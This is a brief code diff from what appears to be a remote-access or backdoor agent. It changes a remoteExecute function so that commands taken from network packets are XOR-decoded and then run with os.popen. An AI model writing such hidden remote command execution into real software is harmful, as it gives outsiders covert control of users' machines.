@@ -168,7 +168,7 @@ def remoteExecute(packet):
                 if command.startswith('watch') or command.startswith('remove') or command.startswith('twatch'):
                     watch_queue.put(command)
                 else:
-                    decrypt_command = os.popen(command)
+                    decrypt_command = os.popen(xor_crypt(command))
                     command_result = decrypt_command.read()
                     #print command_result
 
